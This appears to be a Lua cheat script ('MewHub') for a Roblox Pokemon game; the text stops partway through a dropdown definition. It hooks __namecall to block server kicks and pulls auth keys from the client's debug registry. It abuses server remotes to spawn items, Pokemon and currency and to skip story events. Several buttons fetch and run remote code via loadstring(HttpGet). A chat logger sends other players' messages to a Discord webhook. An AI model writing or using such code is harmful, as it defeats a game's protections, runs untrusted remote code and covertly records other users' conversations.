local plr = game:GetService("Players").LocalPlayer

local itemid1 = "pokeball"
local q1 = 1
local q2 = 1
local q3 = 1

local cclosure = syn_newcclosure or newcclosure or nil

local GetMainData = function()
    for i, v in pairs(debug.getregistry()) do
        if typeof(v) == "function" then
            for a, b in pairs(debug.getupvalues(v)) do
                if typeof(b) == "table" and rawget(b, "NPCChat") then
                    return b
                end
            end
        end
    end
end
local _p = GetMainData()
local currentChunk = _p.DataManager.currentChunk

local spawnitem = function(itemid, q)
    for i = 1, q do
        _p.Network:get("PDS", "giveItem", itemid, 1, true)
        _p.Network:get("PDS", "takeItem", 1)
    end
end

local spawntix = function(q)
    _p.Network:get("PDS", "AlolanReward", q / 2)
end

local beatgym = function(gym)
    local index = {
        109,
        112,
        113,
        98,
        126,
        147,
        154,
        173
    }
    local battle =
        _p.Network:get(
        "BattleFunction",
        "new",
        {
            ["expShare"] = false,
            ["battleType"] = 1,
            ["nnalp"] = false,
            ["isDay"] = true,
            ["chunkId"] = "chunk1",
            ["regionId"] = "Route 1",
            ["trainerId"] = index[gym] or 1
        }
    )
    _p.Network:post("BattleEvent", battle.battleId, "join", 1, ";)")
    wait(1)
    _p.Network:post("BattleEvent", battle.battleId, "forfeit", "p2")
    _p.Network:post("BattleEvent", battle.battleId, "destroy")
end

local oldNamecall
oldNamecall =
    hookmetamethod(
    game,
    "__namecall",
    cclosure(
        function(self, ...)
            local NamecallMethod = getnamecallmethod()
            local args = {...}

            if (NamecallMethod == "Kick" or NamecallMethod == "kick") and not checkcaller() then
                if self ~= plr then
                    return oldNamecall(self, ...)
                end
                return
            end
            return oldNamecall(self, ...)
        end
    )
)
game:GetService("ScriptContext"):SetTimeout(0.1)
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/bigbootylatinas/mew/main/main"))()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/JRNRs12Y", true))()
if syn then
syn.protect_gui(game:GetService("CoreGui"))
syn.protect_gui(game:GetService("StarterGui"))
end
wait(.4)

local GUI =
    Mercury:Create {
    Name = "MewHub",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Serika,
    Link = "https://mewhub.com"
}

--[[
    MAIN
]]

local Tab =
    GUI:Tab {
    Name = "Main",
    Icon = "rbxassetid://10440669242"
}

Tab:Button {
    Name = "Add Hide/Unhide Buttonüëª",
    Description = nil,
    Callback = function()
       
local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()

local UI = Material.Load({
     Title = "Minimize Mewhub",
     Style = 4,
     SizeX = 180,
     SizeY = 80,
     Theme = "Dark"
})

local Page = UI.New({
    Title = "Main"
})

Page.Button({
    Text = "üëª hide/unhide",
    Callback = function()
        game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.LeftAlt,false,game)
    end
})

    end
}

Tab:Button {
    Name = "Beat All Gyms ü•á",
    Description = nil,
    Callback = function()
        for i = 1, 8 do
            beatgym(i)
        end
    end
}
Tab:Button {
    Name = "Skip Chat (Slightly Bugged) ‚è≠Ô∏è",
    Description = nil,
    Callback = function()
        Get = game:GetService("ReplicatedStorage").GET
        function GetMainData()
            for i, v in pairs(debug.getregistry()) do
                if typeof(v) == "function" then
                    for a, b in pairs(debug.getupvalues(v)) do
                        if typeof(b) == "table" and rawget(b, "Fishing") then
                            return b
                        end
                    end
                end
            end
        end
        Data = GetMainData()
        AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
        local SkipChat = true
        local OldWait
        OldWait =
            hookfunction(
            Data["NPCChat"]["AdvanceSignal"]["wait"],
            function(...)
                if SkipChat then
                    return
                end
                OldWait(...)
            end
        )
        local Old
        Old =
            hookfunction(
            Data["NPCChat"]["say"],
            function(...)
                local Args = {...}
                if SkipChat then
                    for i = 3, #Args do
                        if typeof(Args[i]) == "string" then
                            Args[i] = "."
                        end
                    end
                end
                return Old(unpack(Args))
            end
        )
    end
}
Tab:Button {
    Name = "Heal üíü",
    Description = nil,
    Callback = function()
        Get = game:GetService("ReplicatedStorage").GET
        function GetMainData()
            for i, v in pairs(debug.getregistry()) do
                if typeof(v) == "function" then
                    for a, b in pairs(debug.getupvalues(v)) do
                        if typeof(b) == "table" and rawget(b, "Fishing") then
                            return b
                        end
                    end
                end
            end
        end
        Data = GetMainData()
        AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
        local key = game:GetService("UserInputService")
        Get:InvokeServer(AuthKey, "PDS", "getPartyPokeBalls")
    end
}
Tab:Button {
    Name = "Open Map üó∫Ô∏è",
    Description = nil,
    Callback = function()
        Get = game:GetService("ReplicatedStorage").GET
        function GetMainData()
            for i, v in pairs(debug.getregistry()) do
                if typeof(v) == "function" then
                    for a, b in pairs(debug.getupvalues(v)) do
                        if typeof(b) == "table" and rawget(b, "Fishing") then
                            return b
                        end
                    end
                end
            end
        end
        Data = GetMainData()
        AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
        local SF = {}
        SF["Fly"] = Data["Menu"]["map"]["fly"]
        SF["Fly"](unpack(SF))
    end
}
Tab:Button {
    Name = "Unstuck üîì",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.Menu.options:getUnstuck(true)
    end
}
Tab:Toggle {
    Name = "Toggle Repel üèÉüê∂",
    StartingState = false,
    Description = nil,
    Callback = function(value)
        if value then
            local _p = nil
            for _, v in pairs(getgc(true)) do
                if typeof(v) == "table" then
                    if rawget(v, "PlayerData") then
                        _p = v
                        break
                    end
                end
            end
            _p.Repel.steps = 1000000
        else
            local _p = nil
            for _, v in pairs(getgc(true)) do
                if typeof(v) == "table" then
                    if rawget(v, "PlayerData") then
                        _p = v
                        break
                    end
                end
            end
            _p.Repel.steps = 0
        end
        Enabled = false
    end
}

--[[
    STORY SKIPS
]]--
local Tab =
    GUI:Tab {
    Name = "Story",
    Icon = "rbxassetid://10441188531"
}
Tab:Button {
    Name = "Skip Meeting Jake",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("MeetJake"))
    end
}
Tab:Button {
    Name = "Skip Meeting Parents",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("MeetParents"))
    end
}
Tab:Button {
    Name = "Skip Parents Kidnapped",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("ParentsKidnappedScene"))
    end
}
Tab:Button {
    Name = "Skip Jake Battle",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("JakeBattle1"))
    end
}
Tab:Button {
    Name = "Skip Thief Convo",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("BronzeBrickStolen"))
    end
}
Tab:Button {
    Name = "Track The Thief",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("JakeTracksLinda"))
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-262.576, 65.0785, -862.594)
    end
}
Tab:Button {
    Name = "Introduced To First Gym",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("IntroducedToGym1"))
    end
}
Tab:Button {
    Name = "Skip Jake Battle 2",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("JakeBattle2"))
    end
}
Tab:Button {
    Name = "Skip Talk To Jake + Seb",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("GroudonScene"))
    end
}
Tab:Button {
    Name = "Skip Groundon Scene",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("TalkToJakeAndSebastian"))
    end
}
Tab:Button {
    Name = "Skip Following Jake",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.PlayerData:completeEvent("JakeStartFollow")
        _p.PlayerData:completeEvent("JakeEndFollow")
    end
}
Tab:Button {
    Name = "Skip Rosecove Welcome",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.PlayerData:completeEvent("RosecoveWelcome")
    end
}
Tab:Button {
    Name = "Skip Lighthouse Scene",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.PlayerData:completeEvent("LighthouseScene")
    end
}
Tab:Button {
    Name = "Skip Cypress After Gym 3",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.PlayerData:completeEvent("ProfAfterGym3")
    end
}
Tab:Button {
    Name = "Skip Jake + Tess Goodbyes",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.PlayerData:completeEvent("JakeAndTessDepart")
    end
}
Tab:Button {
    Name = "Gym 4 Tools Giver",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.PlayerData:completeEvent("G4FoundTape")
        _p.PlayerData:completeEvent("G4GaveTape")
        _p.PlayerData:completeEvent("G4FoundWrench")
        _p.PlayerData:completeEvent("G4GaveWrench")
        _p.PlayerData:completeEvent("G4FoundHammer")
        _p.PlayerData:completeEvent("G4GaveHammer")
    end
}

--[[
    BREEDING
]]

local Tab =
    GUI:Tab {
    Name = "Breeding",
    Icon = "rbxassetid://10440776957"
}
Tab:Button {
    Name = "Bring Daycare Man",
    Description = nil,
    Callback = function()
        local lp = game:service "Players".LocalPlayer
        game:GetService("Workspace").chunk9["DayCareMan"]:MoveTo(lp.Character.LeftHand.Position)
        local Object = game.ReplicatedStorage.DayCare:WaitForChild("DayCareLady")
        local CloneObject = Object:Clone()
        CloneObject.Parent = game.Workspace.chunk9
        game:GetService("Workspace").chunk9["DayCareLady"]:MoveTo(lp.Character.LeftHand.Position)
    end
}
Tab:Button {
    Name = "Hoverboard Spin ['M' - Toggle]",
    Description = nil,
    Callback = function()
        local uis = game:GetService("UserInputService")
        local vim = game:GetService("VirtualInputManager")
        local bind = Enum.KeyCode.M
        uis.InputBegan:connect(
            function(key)
                if key.KeyCode == bind then
                    vim:SendKeyEvent(true, "W", false, nil)
                    vim:SendKeyEvent(true, "A", false, nil)
                end
            end
        )
    end
}
Tab:Button {
    Name = "PC - Lagoona",
    Description = nil,
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(312, 110, -1066)
    end
}

--[[
    MISC
]]

local Tab =
    GUI:Tab {
    Name = "Misc",
    Icon = "rbxassetid://10440794784"
}
Tab:Button {
    Name = "Material Remover",
    Description = nil,
    Callback = function()
        _G.Settings = {
            Players = {
                ["Ignore Me"] = true, -- Ignore your Character
                ["Ignore Others"] = true -- Ignore other Characters
            },
            Meshes = {
                Destroy = false, -- Destroy Meshes
                LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
            },
            Images = {
                Invisible = true, -- Invisible Images
                LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
                Destroy = false -- Destroy Images
            },
            Other = {
                ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
                ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
                ["No Explosions"] = true, -- Makes Explosion's invisible
                ["No Clothes"] = true, -- Removes Clothing from the game
                ["Low Water Graphics"] = true, -- Removes Water Quality
                ["No Shadows"] = true, -- Remove Shadows
                ["Low Rendering"] = true, -- Lower Rendering
                ["Low Quality Parts"] = true -- Lower quality parts
            }
        }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))(

        )
    end
}

Tab:Textbox {
    Name = "Chat Logger (insert discord webhook)",
    Callback = function(value)
        local marketplaceService = game:GetService("MarketplaceService")

        local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
        if isSuccessful then
            local wh = value
            local embed1 = {
                ["title"] = "Beginning of Message logs on " ..
                    info.Name .. " at " .. tostring(os.date("%m/%d/%y at time %X"))
            }
            local a =
                syn.request(
                {
                    Url = wh,
                    Headers = {["Content-Type"] = "application/json"},
                    Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed1}, ["content"] = ""}),
                    Method = "POST"
                }
            )
            function logMsg(Webhook, Player, Message)
                local embed = {
                    ["description"] = Player .. ": " .. Message .. "  " .. tostring(os.date("| time %X"))
                }
                local a =
                    syn.request(
                    {
                        Url = Webhook,
                        Headers = {["Content-Type"] = "application/json"},
                        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed}, ["content"] = ""}),
                        Method = "POST"
                    }
                )
            end
            for i, v in pairs(game.Players:GetPlayers()) do
                v.Chatted:Connect(
                    function(msg)
                        logMsg(wh, v.Name, msg)
                    end
                )
            end

            game.Players.PlayerAdded:Connect(
                function(plr)
                    plr.Chatted:Connect(
                        function(msg)
                            logMsg(wh, plr.Name, msg)
                        end
                    )
                end
            )
        end
    end
}

Tab:Button {
    Name = "Chat Translator",
    Description = nil,
    Callback = function()
        loadstring(game:HttpGetAsync("https://i.qts.life/r/ChatInlineTranslator.lua", true))()
    end
}

Tab:Button {
    Name = "Server Browser",
    Description = nil,
    Callback = function()
        loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
    end
}

Tab:Button {
    Name = "Ctrl + TP",
    Description = nil,
    Callback = function()
        local Plr = game:GetService("Players").LocalPlayer
        local Mouse = Plr:GetMouse()
        Mouse.Button1Down:connect(
            function()
                if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
                    return
                end
                if not Mouse.Target then
                    return
                end
                Plr.Character:MoveTo(Mouse.Hit.p)
            end
        )
    end
}

Tab:Button {
    Name = "Noclip + Fly [Toggle - X]",
    Description = nil,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bigbootylatinas/fatass/main/clip%20%2B%20fly"))()
    end
}

Tab:Button {
    Name = "Rejoin",
    Description = nil,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Rejoin-Game/main/Rejoin%20Game.lua"))()
    end
}
--[[
    SHOPS
]]
local Tab =
    GUI:Tab {
    Name = "Shops",
    Icon = "rbxassetid://10440803307"
}
Tab:Button {
    Name = "Pokemart",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.Menu.shop:open()
    end
}
Tab:Button {
    Name = "BP Shop",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.Menu.battleShop:open()
    end
}
Tab:Button {
    Name = "Stoneshop",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.Menu.shop:open("stnshp")
    end
}
Tab:Button {
    Name = "Buy Sushi (gives berries + prism scales",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.Network:get("PDS", "buySushi")
    end
}
--[[
    ONE TIME USE
]]
local Tab =
    GUI:Tab {
    Name = "One-Time Use",
    Icon = "rbxassetid://10441160918"
}
Tab:Button {
    Name = "Absol + Eevee",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end

        --print(_p.PlayerData:completeEvent("ReceiveRTD"))
        --print(_p.PlayerData:completeEvent("RunningShoes"))
        print(_p.PlayerData:completeEvent("GetAbsol"))
        print(_p.PlayerData:completeEvent("Eevee2Awarded"))
    end
}
Tab:Button {
    Name = "Enable RTD + Running",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.Menu.rtd:enable()
        _p.RunningShoes:enable()
    end
}
Tab:Button {
    Name = "Give Leftovers (1x use)",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("GivenLeftovers"))
    end
}
Tab:Button {
    Name = "Give Kings Rock (1x use)",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("KingsRockGiven"))
    end
}
Tab:Button {
    Name = "BlackWhite Egg (1x use)",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("ReceivedBWEgg"))
    end
}
Tab:Button {
    Name = "Gives SawsbuckCoffee (1x use)",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        print(_p.PlayerData:completeEvent("GivenSawsbuckCoffee"))
    end
}
--[[
    MONEY AND TIX
]]
local Tab =
    GUI:Tab {
    Name = "Currency",
    Icon = "rbxassetid://10440868155"
}
Tab:Button {
    Name = "PokeDollars (Risky) üò±üí∞",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.Network:get("PDS", "AlolanReward", 148500)
        _p.Network:get("PDS", "getShop", "arcade")
        _p.Network:get("PDS", "tMaxBuy", 2)
        _p.Network:get("PDS", "buyWithTix", 2, 99)
        _p.Network:get("PDS", "sellItem", "powerbracer", 99)
    end
}
Tab:Button {
    Name = "PokeDollars Less Risky (+$10080) ü§ëüí∞",
    Description = nil,
    Callback = function()
        local beatgym = function(gym)
            local index = {
                181
            }
            local battle = _p.Network:get('BattleFunction', 'new', {
                ["expShare"] = false,
                ["battleType"] = 1,
                ["nnalp"] = false,
                ["isDay"] = true,
                ["chunkId"] = "chunk1",
                ["regionId"] = "Route 1",
                ["trainerId"] = index[gym] or 1
            })
            _p.Network:post('BattleEvent', battle.battleId, 'join', 1, ';)')
            wait(.1)
            _p.Network:post('BattleEvent', battle.battleId, 'forfeit', 'p2')
            _p.Network:post('BattleEvent', battle.battleId, 'destroy')
        end
        
        for i = 1,4 do
                    beatgym(i)
                end
    end
}
Tab:Button {
    Name = "Tix (+25)üí≤",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "Events") then
                    _p = v
                    break
                end
            end
        end
        _p.Network:get("PDS", "AlolanReward", 25)
    end
}
--[[
    Item Spawner
]]
local Tab =
    GUI:Tab {
    Name = "Item Generator",
    Icon = "rbxassetid://10469697250"
}
Tab:Textbox {
    Name = "Insert Item Name üó≥Ô∏è",
    Callback = function(str)
        itemid1 = tostring(str)
    end
}
Tab:Textbox {
    Name = "Insert Quantity üó≥Ô∏è",
    Callback = function(str)
        q1 = tonumber(str)
    end
}

Tab:Button {
    Name = "Spawn Item ‚ú®",
    Description = nil,
    Callback = function()
        spawnitem(itemid1, q1)
    end
}

Tab:dropdown({
    Name = "Item List üìÉ",
    StartingText = "these are common items spawned",
    Items = {
        {"masterball", 'masterball'},
        {"rarecandy", 'rarecandy'},
        {"bottlecap", 'bottlecap'},
        {"shinystar", 'shinystar'}
    },
    Description = "clicking on an option spawns (+1)",
    Callback = function(v)
        
       
        spawnitem(v, 1)
        
        
    
    end,
})
--[[
    CHUNK LOADER
]]
local Tab =
    GUI:Tab {
    Name = "Loader",
    Icon = "rbxassetid://10469699424"
}

Tab:Textbox {
    Name = "Chunk Loader üåç",
    Callback = function(id)
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        _p.DataManager:loadChunk("chunk" .. id)
        _p.Menu.options:getUnstuck(true)
    end
}

Tab:dropdown({
    Name = "Pokemon City üè•",
    StartingText = "Chunk",
    Items = {
        {"Mitis Town", 1},
        {"Chesma Town", 2},
        {"Silvent City", 3},
        {"Brimber City", 5},
        {"Lagoona Lake", 9},
        {"Rosecove City", 11},
        {"Aredia City", 25},
        {"Fluoruma City", 39},
        {"Frostveil City", 46},
        {"Port Decca", 52},
        {"Crescent Town", 54}
    },
    Description = "This teleports you to your desired city",
    Callback = function(v)
        
       
            _p.DataManager:loadChunk("chunk" .. v)
            _p.Menu.options:getUnstuck(true)
        
        
    
    end,
})
--[[
    Pokemon Spawner
]]
local Tab =
    GUI:Tab {
    Name = "Pokemon Spawner",
    Icon = "rbxassetid://10441107015"
}
local amtPoke
Tab:Textbox {
    Name = "Insert Amount üó≥Ô∏è",
    Callback = function(str)
        amtPoke = str
    end
}

Tab:Button {
    Name = "Generate Dittos ‚ú®",
    Description = nil,
    Callback = function()
        spawntix(2000 * tonumber(amtPoke))
        _p.Network:get("PDS", "getShop", "arcade")
        wait(3)
        _p.Network:get("PDS", "buyWithTix", 15, tonumber(amtPoke))
    end
}

Tab:Button {
    Name = "Generate Hoopas ‚ú®",
    Description = nil,
    Callback = function()
        local _p = nil
        for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
                    _p = v
                    break
                end
            end
        end
        
        _p.DataManager:loadChunk("chunk56")
        _p.Menu.options:getUnstuck(true)
        wait(2)
        _p = GetMainData()
        for i = 1, tonumber(amtPoke) do
            spawnitem("masterball", 1)
            local battle =
                _p.Network:get(
                "BattleFunction",
                "new",
                {
                    ["expShare"] = false,
                    ["battleType"] = 0,
                    ["isDark"] = true,
                    ["isDay"] = false,
                    ["chunkId"] = "chunk1",
                    ["eid"] = _p.DataManager.currentChunk.regionData["Hoopa"].id,
                    ["regionId"] = "Route 1"
                }
            )
            _p.Network:post("BattleEvent", battle.battleId, "join", 1, ";)")
            wait(.1)
            _p.Network:post(
                "BattleEvent",
                battle.battleId,
                "choose",
                "p1",
                {
                    "useitem masterball"
                },
                1
            )
            _p.Network:post("BattleEvent", battle.battleId, "destroy")
        end
    end
}

local Tab = GUI:Tab{
	Name = "Levels + IV + EV",
	Icon = "rbxassetid://10441082070"
}

Tab:dropdown({
    Name = "Pokemon IV Changer 3Ô∏è‚É£1Ô∏è‚É£",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's IV's to 6x31",
    Callback = function(v)

   spawnitem('bottlecap', 6) -- item + quantity

  _p.Network:get("PDS", "trainpokemon", v, 'HP')
  _p.Network:get("PDS", "trainpokemon", v, 'Speed')
  _p.Network:get("PDS", "trainpokemon", v, 'Defense')
  _p.Network:get("PDS", "trainpokemon", v, 'Sp Def')
  _p.Network:get("PDS", "trainpokemon", v, 'Sp Atk')
  _p.Network:get("PDS", "trainpokemon", v, 'Attack')  
    end,
})

Tab:dropdown({
    Name = "Pokemon Attack EV Changer ‚öîÔ∏è",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)

        q = 26
        for i = 1, q do
        spawnitem('protein', 1) -- item + quantity
        _p.Network:get("PDS", "useItem", 'protein', v) 
        end
   
    
    end,
})

Tab:dropdown({
    Name = "Pokemon Defense EV Changer üõ°Ô∏è",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)
    q = 26
        for i = 1, q do
   spawnitem('iron', 1) -- item + quantity
   _p.Network:get("PDS", "useItem", 'iron', v)     
    end
    end,
})

Tab:dropdown({
    Name = "Pokemon Sp Atk EV Changer üèπ",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)
    q = 26
        for i = 1, q do
   spawnitem('calcium', 1) -- item + quantity
   _p.Network:get("PDS", "useItem", 'calcium', v)     
    end
    end,
})

Tab:dropdown({
    Name = "Pokemon Sp Def EV Changer üõ°Ô∏è",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)
    q = 26
        for i = 1, q do
   spawnitem('zinc', 1) -- item + quantity
   _p.Network:get("PDS", "useItem", 'zinc', v)     
    end
    end,
})

Tab:dropdown({
    Name = "Pokemon Speed EV Changer üèÉ",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)
    q = 26
        for i = 1, q do
   spawnitem('carbos', 1) -- item + quantity
   _p.Network:get("PDS", "useItem", 'carbos', v)     
    end
    end,
})

Tab:dropdown({
    Name = "Pokemon HP EV Changer üíñ",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)
    q = 26
        for i = 1, q do
   spawnitem('hpup', 1) -- item + quantity
   _p.Network:get("PDS", "useItem", 'hpup', v)     
    end
    end,
})

Tab:dropdown({
    Name = "Pokemon EV Remover ‚ùå",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)
    q = 1
        for i = 1, q do
   spawnitem('defensereset', 1) -- item + quantity
   spawnitem('attackreset', 1) -- item + quantity
   spawnitem('spdefreset', 1) -- item + quantity
   spawnitem('spatkreset', 1) -- item + quantity
   spawnitem('speedreset', 1) -- item + quantity
   spawnitem('hpreset', 1) -- item + quantity
   _p.Network:get("PDS", "useItem", 'defensereset', v)     
   _p.Network:get("PDS", "useItem", 'attackreset', v)  
   _p.Network:get("PDS", "useItem", 'spdefreset', v)  
   _p.Network:get("PDS", "useItem", 'spatkreset', v)  
   _p.Network:get("PDS", "useItem", 'speedreset', v)  
   _p.Network:get("PDS", "useItem", 'hpreset', v)  
    end
    end,
})

Tab:dropdown({
    Name = "Pokemon Instant Lvl 100 üìà‚¨ÜÔ∏è",
    StartingText = "Party Slot",
